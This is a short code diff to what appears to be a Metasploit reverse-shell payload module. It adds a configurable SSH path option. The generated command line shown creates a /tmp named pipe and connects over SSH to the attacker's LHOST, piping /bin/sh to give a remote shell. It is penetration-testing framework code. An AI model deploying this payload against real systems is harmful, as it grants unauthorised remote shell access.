@@ -29,6 +29,9 @@ module MetasploitModule
       'RequiredCmd' => 'ssh',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
+    register_options([
+      OptString.new('SSH_PATH', [true, 'The path of SSH', 'ssh'])
+    ])
     register_advanced_options(
       [
         Msf::OptString.new('SshClientOptions', [
@@ -54,6 +57,6 @@ module MetasploitModule
     backpipe = Rex::Text.rand_text_alpha_lower(4..8)
     lport = datastore['LPORT'] == 22 ? '' : "-p #{datastore['LPORT']} "
     opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = "-o #{e} " }.join
-    "mkfifo /tmp/#{backpipe};ssh -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
+    "mkfifo /tmp/#{backpipe};#{datastore['SSH_PATH']} -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
   end
 end
